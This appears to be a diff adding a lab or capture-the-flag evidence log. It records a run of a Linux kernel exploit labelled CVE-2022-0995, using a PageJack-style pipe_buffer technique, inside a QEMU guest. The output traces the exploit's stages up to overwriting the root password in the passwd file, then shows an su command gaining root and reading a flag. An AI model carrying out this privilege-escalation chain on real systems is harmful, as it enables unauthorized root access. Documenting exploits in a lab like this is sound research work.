@@ -1,0 +1,30 @@
+PageJack QEMU guest evidence capture
+Date: 2026-09-13 (Asia/Shanghai)
+Runner: Page_Jack_pwn/run_gdb.sh
+
+QEMU guest:
+
+~ $ /exp/exp
+[RLIMIT_NOFILE] soft limit= 0x1000  hard limit= 0x1000
+[RLIMIT_AS] soft limit= 0x8000000000000000  hard limit= 0x8000000000000000
+[*] CVE-2022-0995 by Lotus
+[*] spray pipe_buffer...
+[+] edit the pipe_buffer size to 0x60
+[*] allocating pipe pages...
+[*] Create 2 holes in pipe_buffer...
+[+] Trigger OOB
+[*] finding...
+found pipe coincide at idx:28 and 27
+[*] uaf one of the pipe_buffer->page
+[*] Spray pwd file struct...
+[*] Edit pwd file->f_mode...
+Setting root password to "Lotus"...
+[*] finally: edit the pwd file
+Write Success:109!
+[*] Now the password is:
+root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh
+
+~ $ echo Lotus | su root -c 'id; strings /flag | head -n 1'
+Password:
+uid=0(root) gid=0(root) groups=0(root)
+flag{PageJack_Demo_Flag_ZJU_RKP}
